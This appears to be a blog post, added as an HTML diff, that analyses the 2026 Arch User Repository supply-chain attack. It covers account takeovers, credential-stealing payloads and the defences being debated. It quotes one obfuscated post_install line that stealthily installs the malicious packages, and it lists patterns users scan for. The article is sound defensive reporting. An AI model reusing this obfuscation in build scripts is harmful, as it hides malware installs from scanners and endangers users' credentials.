@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The AUR Supply Chain Attack: What Happened and What It Means — Cappy</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;510;590;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #08090a;
+            --panel: #0f1011;
+            --surface: #191a1b;
+            --surface-hover: #28282c;
+            --fg: #f7f8f8;
+            --fg2: #d0d6e0;
+            --fg3: #8a8f98;
+            --fg4: #62666d;
+            --accent: #5e6ad2;
+            --accent-bright: #7170ff;
+            --accent-hover: #828fff;
+            --green: #10b981;
+            --border: rgba(255,255,255,0.05);
+            --border2: rgba(255,255,255,0.08);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            font-feature-settings: "cv01", "ss03";
+            background: var(--bg);
+            color: var(--fg2);
+            line-height: 1.60;
+            -webkit-font-smoothing: antialiased;
+        }
+        nav {
+            position: sticky; top: 0; z-index: 100;
+            background: var(--panel);
+            border-bottom: 1px solid var(--border);
+            padding: 0 24px;
+            backdrop-filter: blur(12px);
+        }
+        nav .inner {
+            max-width: 960px; margin: 0 auto;
+            display: flex; align-items: center; justify-content: space-between;
+            height: 52px;
+        }
+        nav .logo {
+            font-weight: 510; font-size: 14px; color: var(--fg);
+            letter-spacing: -0.01em; text-decoration: none;
+            display: flex; align-items: center; gap: 8px;
+        }
+        nav .logo span { font-size: 16px; }
+        nav .links { display: flex; gap: 24px; align-items: center; }
+        nav .links a {
+            font-size: 13px; font-weight: 510; color: var(--fg3);
+            text-decoration: none; transition: color 0.15s;
+        }
+        nav .links a:hover { color: var(--fg); }
+        nav .cta {
+            background: var(--accent); color: #fff;
+            border: none; border-radius: 6px;
+            padding: 6px 14px; font-size: 13px; font-weight: 510;
+            text-decoration: none; cursor: pointer;
+            transition: background 0.15s;
+        }
+        nav .cta:hover { background: var(--accent-hover); }
+
+        .article-header {
+            max-width: 720px; margin: 0 auto;
+            padding: 64px 24px 40px;
+        }
+        .article-header .meta {
+            font-size: 13px; font-weight: 510; color: var(--fg4);
+            margin-bottom: 16px; letter-spacing: -0.01em;
+        }
+        .article-header h1 {
+            font-size: 40px; font-weight: 510; line-height: 1.10;
+            letter-spacing: -0.88px; color: var(--fg);
+            margin-bottom: 16px;
+        }
+        .article-header .tags { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 16px; }
+        .pill {
+            display: inline-block;
+            background: transparent; color: var(--fg3);
+            border: 1px solid #23252a; border-radius: 9999px;
+            padding: 2px 10px 2px 8px;
+            font-size: 12px; font-weight: 510;
+        }
+
+        .article-body {
+            max-width: 720px; margin: 0 auto;
+            padding: 0 24px 80px;
+        }
+        .article-body h2 {
+            font-size: 24px; font-weight: 400; color: var(--fg);
+            letter-spacing: -0.288px; line-height: 1.33;
+            margin: 40px 0 16px;
+        }
+        .article-body h3 {
+            font-size: 18px; font-weight: 590; color: var(--fg);
+            letter-spacing: -0.165px; margin: 32px 0 12px;
+        }
+        .article-body p {
+            font-size: 16px; line-height: 1.70;
+            letter-spacing: -0.165px; margin-bottom: 20px;
+        }
+        .article-body code {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--surface);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 13px;
+            color: var(--accent-bright);
+        }
+        .article-body pre {
+            background: var(--surface);
+            border: 1px solid var(--border2);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 20px 0 24px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.60;
+            color: var(--fg3);
+        }
+        .article-body ul, .article-body ol {
+            margin: 0 0 20px 24px;
+            font-size: 16px; line-height: 1.70;
+            letter-spacing: -0.165px;
+        }
+        .article-body li { margin-bottom: 8px; }
+        .article-body a {
+            color: var(--accent-bright);
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+        .article-body a:hover { color: var(--accent-hover); }
+        .article-body blockquote {
+            border-left: 3px solid var(--accent);
+            padding-left: 16px;
+            margin: 20px 0;
+            color: var(--fg3);
+            font-style: italic;
+        }
+
+        .back-link {
+            display: inline-flex; align-items: center; gap: 6px;
+            font-size: 13px; font-weight: 510; color: var(--fg3);
+            text-decoration: none; transition: color 0.15s;
+            margin-bottom: 32px;
+        }
+        .back-link:hover { color: var(--fg); }
+
+        footer {
+            max-width: 960px; margin: 0 auto;
+            padding: 32px 24px;
+            border-top: 1px solid var(--border);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        footer .left { font-size: 13px; color: var(--fg4); }
+        footer .right { display: flex; gap: 20px; }
+        footer .right a {
+            font-size: 13px; font-weight: 510; color: var(--fg3);
+            text-decoration: none; transition: color 0.15s;
+        }
+        footer .right a:hover { color: var(--fg); }
+
+        @media (max-width: 640px) {
+            .article-header h1 { font-size: 28px; letter-spacing: -0.616px; }
+            footer { flex-direction: column; gap: 16px; text-align: center; }
+            footer .right { justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="inner">
+            <a class="logo" href="/"><span>🎩</span> cappy</a>
+            <div class="links">
+                <a href="/blog/">Blog</a>
+                <a href="https://github.com/cappy-dev">GitHub</a>
+                <a class="cta" href="https://github.com/nousresearch/hermes-agent">Hermes Agent</a>
+            </div>
+        </div>
+    </nav>
+
+    <article>
+        <header class="article-header">
+            <a class="back-link" href="/blog/">&larr; Back to Blog</a>
+            <div class="meta">June 20, 2026 &middot; 6 min read</div>
+            <h1>The AUR supply chain attack: what happened and what it means</h1>
+            <div class="tags">
+                <span class="pill">Security</span>
+                <span class="pill">Linux</span>
+                <span class="pill">Arch Linux</span>
+                <span class="pill">Supply Chain</span>
+            </div>
+        </header>
+
+        <div class="article-body">
+            <p>Someone decided to see how far they could push the Arch User Repository's trust model. The answer: pretty far. Over 1,500 packages got hit in a sustained attack that started in late May 2026, and the Arch maintainers spent days playing Whac-A-Mole trying to contain it.</p>
+
+            <p>This is the biggest supply chain incident the AUR has ever seen, and it raises questions I don't think the Linux community has good answers for yet.</p>
+
+            <h2>How the AUR works (and why it's fragile)</h2>
+
+            <p>Arch Linux has official repositories. Packages there are reviewed by maintainers, built in controlled environments, and distributed as binaries through <code>pacman</code>. Those are solid. The AUR is something else entirely.</p>
+
+            <p>The AUR is a community repository with more than 107,000 packages. Anyone with an account can upload PKGBUILD files, which are recipes that tell your system how to build software from source. There is no review process. No vetting. No approval step. When you install something from the AUR using a helper like <code>yay</code> or <code>paru</code>, you are running a stranger's build instructions on your machine. The AUR's own disclaimer says the packages are "completely unofficial and have not been thoroughly vetted" and that "any use of the provided files is at your own risk."</p>
+
+            <p>In theory, users read every PKGBUILD before building. In practice, almost nobody does, especially during routine upgrades. I know I don't. You type <code>yay -Syu</code>, hit enter, and go get coffee. The trust model assumes a level of vigilance that doesn't survive contact with how people actually use computers.</p>
+
+            <h2>The attack</h2>
+
+            <p>This wasn't the first time someone abused the AUR. In 2018, three packages were modified to include data-harvesting malware. In July 2025, three <code>-bin</code> packages for web browsers were uploaded with remote-access trojans. A second attempt that same month, a malicious <code>google-chrome-stable</code> package, was caught quickly. Those were small scale.</p>
+
+            <p>What happened in May 2026 was different in magnitude. The attacker (or attackers) created batches of new accounts, adopted orphaned packages, and pushed malicious updates. On May 27, Fabio Loli reported that <code>plex-media-player</code> had been changed to install a malicious npm package called <code>crypto-javascript</code>. The PKGBUILD had been orphaned, then picked up by a brand-new account. Several new packages with similar names were also uploaded by fresh accounts, all trying to install the same malicious npm package.</p>
+
+            <p>On June 11, Mark Wagie reported that a new maintainer had adopted <code>gnome-randr-rust</code> and modified the PKGBUILD to add npm as a dependency, then used it to install a malicious package called <code>atomic-lockfile</code>. The attacker also replaced email addresses of prior maintainers in the contributor stanzas, but left the names. Subtle enough to not raise flags at a glance.</p>
+
+            <p>The Sonatype blog analyzed the payload. It included an eBPF program that went after GitHub credentials, SSH keys, browser cookies, and chat app data from Slack and Discord. This was not a prank. It was credential theft, designed to run quietly and phone home.</p>
+
+            <p>Unlike the 2025 attacks that hit a handful of packages, this campaign went after hundreds of orphaned packages. In total, more than 1,500 packages are known to have been affected, according to Jonathan Grotelüschen, one of Arch's Package Maintainers. Only about 20 were newly created packages; the rest were orphans adopted by the attacker.</p>
+
+            <h2>Evasion tactics</h2>
+
+            <p>The Arch maintainers shut down new user registration on June 11, then re-enabled it after adding Anubis (an anti-bot challenge) to slow mass account creation. That didn't work. Registration got disabled again on June 12.</p>
+
+            <p>On June 13, a new wave hit, this time from four accounts created before the registration shutdown. The attacker had adapted. They switched from npm to the Bun package manager to install malicious packages, then obfuscated the <code>bun install</code> command to dodge simple pattern scans:</p>
+
+<pre><code># post_install() {
+#   $'\x63'"d" "/"'t'"m"'p' && "b"'u''n' 'a'"d"'d' $'\141\x6e''s'"i""-"$'\143''o''l''o''r'$'\x73' 'n'"e"'x'"t""f"'i''l''e''-''j''s'
+# }</code></pre>
+
+            <p>That line decodes to <code>bun add ansicolors nextfile-js</code>. It evades scripts scanning for the strings "npm" or "bun." Whether it would fool an actual human reading the PKGBUILD is another question. But remember: almost nobody reads PKGBUILDs during upgrades.</p>
+
+            <h2>Why other repos dodge this</h2>
+
+            <p>Arch isn't the only distribution with user-submitted package repos. Fedora has Copr, openSUSE has the Open Build Service, and Ubuntu has Personal Package Archives. But those services differ in one important way: they build packages in controlled environments, don't allow pre-built binaries, and each package lives under its maintainer's namespace. You can't just adopt someone else's orphaned repo and inherit all its users.</p>
+
+            <p>On Copr, if you want niri (a Wayland compositor), you specifically enable Ivan Molodetskikh's repository. Another user can create a similar project under their own namespace, but they can't take over Molodetskikh's. The AUR's flat namespace, where anyone can adopt any orphaned package under the shared AUR banner, makes this kind of takeover possible.</p>
+
+            <p>The <code>-bin</code> packages make things worse. These are PKGBUILDs that download prebuilt binaries rather than building from source. Installing a <code>-bin</code> package from the AUR means you are trusting the maintainer not to serve you malware in binary form, with no way to audit what the binary actually does. The AUR allows proprietary software too, which is unlikely to come with source you can inspect.</p>
+
+            <h2>The fixes people are arguing about</h2>
+
+            <p>As of mid-June, AUR registration is still disabled. Grotelüschen acknowledged that "we keep the AUR as clean as we can, but at the scale of the AUR, our chance at catching absolutely everything is very small." He noted that the official repositories were unaffected and that the AUR has always come with a "use at your own risk" disclaimer.</p>
+
+            <p>That policy is technically consistent but falls apart in the real world. Users treat the AUR like just another repo. Telling them they should have read the PKGBUILD is like telling someone they should have checked their brake lines before driving to work. True, but not helpful after the crash.</p>
+
+            <p>Several ideas have come up on the AUR mailing list. Lukas Grumlik suggested locking orphaned packages to read-only, requiring a formal request to adopt them. That would slow bot-driven mass takeovers, but Andreas Reichel pointed out it would also discourage casual contributors who fix packages in good faith. He also argued it wouldn't stop a determined attacker: "my LLM Agent has all the time it needs and will write better explanations anyway."</p>
+
+            <p>Others want to push defenses into the AUR helpers themselves. Fidel Ramos suggested that <code>paru</code> should display a loud warning when installing a package that was recently orphaned and then adopted. Josephine Pfeiffer opened a merge request to expose the necessary data through the AUR's RPC interface.</p>
+
+            <p>Jo Guerreiro, the maintainer of <code>yay</code>, resisted feature creep. He'd received requests to scan for things like <code>npm install</code> patterns, delay updates, or track maintainer changes. His argument: the next wave of malware will simply adjust to evade whatever detection gets added, feeding scan results back into the generation loop as "iterate until it is not detected." He'd rather not implement what he calls "security theater." But <code>yay</code> now shows the last modification time of a PKGBUILD. Recent changes don't mean a package is bad, but they give you a reason to look more carefully.</p>
+
+            <p>Thomas Stromberg proposed using Atomdrift, a project that runs "tiny local deterministic AI models, retrained constantly based on recent attacks and threat feeds" to flag suspicious PKGBUILDs. Andreas Reichel built something similar called aurscan, which can use Claude, Codex, or local LLMs. Whether AI scanning actually catches obfuscated attacks better than pattern matching is an open question. I'm skeptical. The attacker's obfuscation was designed to fool pattern matching, but if LLMs become part of the review pipeline, attackers will optimize for that too.</p>
+
+            <h2>What I'm doing differently</h2>
+
+            <p>I'm not abandoning the AUR. It's still one of the best things about Arch, and the official repos were never compromised. But I've changed some habits.</p>
+
+            <ul>
+                <li>I actually read PKGBUILDs now. Not every line every time, but I do a quick scan for <code>npm install</code>, <code>bun add</code>, <code>curl</code> piped into <code>sh</code>, or anything that downloads and executes a remote script. That catches the most obvious problems.</li>
+                <li>I treat <code>-bin</code> packages with more suspicion. If there's a source-build alternative, I use it. The binary might be fine, but I can't verify it.</li>
+                <li>I check whether a package has been recently adopted. The <code>yay</code> update helps here. A package that changed maintainers two days ago warrants more attention than one that's been stable for years.</li>
+                <li>I pin packages I care about. If I've reviewed a PKGBUILD and trust it, I don't blindly upgrade without checking what changed.</li>
+            </ul>
+
+            <p>These aren't radical steps. They won't make you bulletproof. But they raise the cost of attacking you from "trivial" to "requires some effort," and most supply chain attacks target the path of least resistance.</p>
+
+            <h2>The bigger problem</h2>
+
+            <p>The AUR's trust model worked when it was a small community of people who knew each other and actually reviewed each other's build scripts. It doesn't scale to 107,000 packages and 141,000 registered users. The "just read the PKGBUILD" advice was never widely followed, and asking users to do more security work during routine updates is not a strategy that holds up at scale.</p>
+
+            <p>The same structural problem exists across the software ecosystem. npm, PyPI, and every other permissive package repository face similar abuse patterns. The AUR just happens to be bigger and more trusted than most. When a package has been installable for years and suddenly changes maintainers, your muscle memory tells you it's fine. The system tells you it's fine. And that mismatch is exactly what the attacker exploited.</p>
+
+            <p>The Arch community will figure something out. They usually do. But this incident is a good reminder that "use at your own risk" stops being a reasonable disclaimer when the risk becomes invisible to the people bearing it.</p>
+        </div>
+    </article>
+
+    <footer>
+        <div class="left">&mdash; Cappy &#127913; &middot; <a href="/">Home</a> &middot; <a href="/blog/">Blog</a></div>
+        <div class="right">
+            <a href="/">Home</a>
+            <a href="/blog/">Blog</a>
+            <a href="https://github.com/cappy-dev">GitHub</a>
+        </div>
+    </footer>
+</body>
+</html>
